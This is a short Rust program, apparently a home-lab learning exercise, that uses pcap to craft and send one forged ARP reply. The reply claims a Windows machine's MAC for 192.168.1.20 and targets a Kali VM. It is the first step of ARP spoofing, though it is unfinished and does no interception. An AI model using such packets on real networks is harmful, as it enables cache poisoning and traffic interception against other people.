mod arp_spoof;

use pcap::{Device, Capture};

fn send_arp_reply(device_name: String){
    
    let mut capture = Capture::from_device(device_name.as_str())
        .unwrap()
        .promisc(true)
        .immediate_mode(true)
        .open().
        unwrap();

    let packet_bytes: [u8; 60] = [
        // --- ETHERNET HEADER (14 bytes) ---
        0x00, 0x0c, 0x29, 0xf4, 0x95, 0x0e, // Dst MAC kali vm
        0x88, 0xd8, 0x2e, 0x98, 0x74, 0x43, // Src MAC windows
        0x08, 0x06,                         // EtherType (ARP)

        // --- ARP MESSAGE (28 bytes) ---
        0x00, 0x01,                         // Hardware Type (Ethernet)
        0x08, 0x00,                         // Protocol Type (IPv4)
        0x06,                               // Hardware Size
        0x04,                               // Protocol Size
        0x00, 0x02,                         // Opcode (2 = Reply)

        0x88, 0xd8, 0x2e, 0x98, 0x74, 0x43, // Sender MAC windows
        0xc0, 0xa8, 0x01, 0x14,             // Sender IP (192.168.1.20)

        0x00, 0x0c, 0x29, 0xf4, 0x95, 0x0e, // Target MAC
        0xC0, 0xA8, 0x43, 0x85,             // Target IP (192.168.67.133)

        // --- PADDING (18 bytes) ---
        // Fill with zeros to meet the 60-byte minimum
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ];
    println!("Sending packet");
    capture.sendpacket(packet_bytes).unwrap();
}
fn main() {

    // TODO try to get the packet over to the kali vm. Check the network device that needs to be used
    let dev = Device::lookup().expect("No device found");
    // println!(dev)

    send_arp_reply(dev.unwrap().name);

}
